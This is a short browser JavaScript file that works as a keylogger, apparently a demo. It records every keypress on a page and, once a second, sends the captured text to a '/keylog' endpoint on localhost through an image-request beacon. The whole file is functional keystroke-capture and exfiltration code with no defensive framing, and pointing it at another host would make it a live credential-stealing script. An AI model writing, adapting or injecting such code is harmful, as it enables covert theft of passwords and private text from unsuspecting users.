(function() {
	var keys = '';
	 
	document.onkeypress = function(e) {
	    /*var get = window.event ? event : e;
	    var key = get.keyCode ? get.keyCode : get.charCode;*/
	    var key = e.keyCode ? e.keyCode : e.charCode;
	    key = String.fromCharCode(key);
	    keys += key;
		console.log("keypress", e, keys);
	}

	window.setInterval(function() {
		console.log("interval", keys, keys.length);
		if(keys.length > 0) {
			var proto = location.protocol;
			// nothing useful to be done with file protocol
			if(proto == 'file:') {
				proto = 'http:';
			}

			var encoded = encodeURIComponent(keys);
			var src = proto + '//localhost/keylog?k=' + encoded;
	    	new Image().src = src;
	    	keys = '';
	    	console.log(src);
	    }
	}, 1000);
})();
